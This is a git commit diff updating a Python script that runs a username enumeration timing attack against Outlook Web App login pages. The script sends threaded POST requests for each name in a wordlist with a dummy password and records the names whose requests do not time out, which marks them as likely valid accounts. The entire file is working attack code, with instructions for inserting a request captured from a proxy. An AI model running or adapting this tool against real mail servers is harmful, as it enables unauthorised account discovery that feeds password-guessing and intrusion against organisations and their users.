ef9e095a47d42521297b1bb4a3f78c5fa4a757d9
Jonathan Echavarria <jrec93@gmail.com>
2016-03-31 10:51:48 -0400

    Updated OWA Timing attack tester

--- enumeration/OWA/OWA_timing_attack.py
+++ enumeration/OWA/OWA_timing_attack.py
@@ -3,11 +3,12 @@
 # MAKE SURE YOU READ THE INSTRUCTIONS CAREFULLY
 # I just pull the request out of burpsuite using the "Copy as Python-Requests" extension
 # Und3rf10w
+
 import requests
 import threading
 import time
 import argparse
-from sys import argv
+from sys import argv,exc_info
 from multiprocessing import Pool, freeze_support
 import itertools
 
@@ -29,54 +30,60 @@ debug = args.debug
 verbose = args.verbose
 
 if debug == True:
-	verbose = True
+        verbose = True
 
 
 def main():
-	assign_file_to_list(filepath) # returns fuzzvals list
-	pool = Pool(threads)
-	pool.map(postreq_wrapper, itertools.izip(fuzzvals, itertools.repeat(timeoutval), itertools.repeat(outfile)))
+        assign_file_to_list(filepath) # returns fuzzvals list
+        pool = Pool(threads)
+        print "Press CTRL + \\ if you need to exit"
+        pool.map(postreq_wrapper, itertools.izip(fuzzvals, itertools.repeat(timeoutval), itertools.repeat(outfile)))
 
 
 def assign_file_to_list(filepath):
-	global fuzzvals
-	f = open(filepath, "r")
-	org_fuzzvals = f.readlines()
-	fuzzvals = []
-	f.close()
-	for i in range(len(org_fuzzvals)):
-		fuzzvals.append(org_fuzzvals[i].strip('\n'))
-	return fuzzvals
+        global fuzzvals
+        f = open(filepath, "r")
+        org_fuzzvals = sorted(f.readlines())
+        fuzzvals = []
+        f.close()
+        for i in range(len(org_fuzzvals)):
+                fuzzvals.append(org_fuzzvals[i].strip('\n'))
+        return fuzzvals
 
 def postreq_wrapper(args):
-	return postreq(*args)
+        return postreq(*args)
 
 def postreq(fuzzval, timeoutval, outfile):
-	try:
-		if debug == True:
-			print "DEBUG: current fuzzval %s" % str(fuzzval)
-			start_time = time.time()
-		# requests pulled from burpsuite extension: Copy as Python-Requests
-		# ensure that you add timeout=timeoutval before the last ')' and after the last '}' in your request
-		# REPLACE THE FOLLOWING LINE
-		r = requests.post("https://mail.example.com:443/owa/auth.owa", headers={"User-Agent": "Mozilla/5.0 legit user agent", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Cookie": "ClientId=XXXXXXXXXXXXXXX; PrivateComputer=true", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}, data={"destination": "https://mail.example.com/owa/", "flags": "4", "forcedownlevel": "0", "username": str(fuzzval), "password": "itdoesntevenmatter", "passwordText": "", "isUtf8": "1"}, timeout=timeoutval)
-		if verbose == True:
-			print "INFO: Value %s succeded" % str(fuzzval)
-		if debug == True:
-			print("DEBUG: %s seconds for this request to complete") % (time.time() - start_time )
-			print "DEBUG: Request returned %d" % r.status_code
-		if outfile != None:
-			o = open(outfile, "a")
-			o.write(fuzzval + '\n')
-			o.close()
-		else:
-			print "%s" % fuzzval
-	except requests.exceptions.ReadTimeout:
-		if verbose == True:
-			print "ERROR: Value %s didn't work because the request timed out" % str(fuzzval)
-		pass
+        try:
+                if debug == True:
+                        print "DEBUG: current fuzzval %s" % str(fuzzval)
+                        start_time = time.time()
+                # requests pulled from burpsuite extension: Copy as Python-Requests
+                # ensure that you add timeout=timeoutval before the last ')' and after the last '}' in your request
+                # REPLACE THE FOLLOWING LINE, NOTING THE LOCATION OF 'str(fuzzval)' AND 'timeout=timeoutval'
+                r = requests.post("https://mail.example.com:443/owa/auth.owa", headers={"User-Agent": "Mozilla/5.0 legit user agent", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Cookie": "ClientId=XXXXXXXXXXXXXXX; PrivateComputer=true", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}, data={"destination": "https://mail.example.com/owa/", "flags": "4", "forcedownlevel": "0", "username": str(fuzzval), "password": "itdoesntevenmatter", "passwordText": "", "isUtf8": "1"}, timeout=timeoutval)
+                if verbose == True:
+                        print "INFO: Value %s succeded" % str(fuzzval)
+                if debug == True:
+                        print "DEBUG: %s seconds for this request to complete" % (time.time() - start_time )
+                        print "DEBUG: Request returned %d" % r.status_code
+                if outfile != None:
+                        o = open(outfile, "a")
+                        o.write(fuzzval + '\n')
+                        o.close()
+                else:
+                        print "%s" % fuzzval
+        except requests.exceptions.ReadTimeout:
+                if verbose == True:
+                        print "INFO: Value %s didn't work because the request timed out" % str(fuzzval)
+                pass
+        except:
+                print "ERROR: An unhandled exception was raised, skipping test for value: %s" % str(fuzzval)
+                print exc_info()[0]
+                pass
+
 
 if __name__=="__main__":
-	freeze_support()
-	main()
-	
+        freeze_support()
+        main()
+
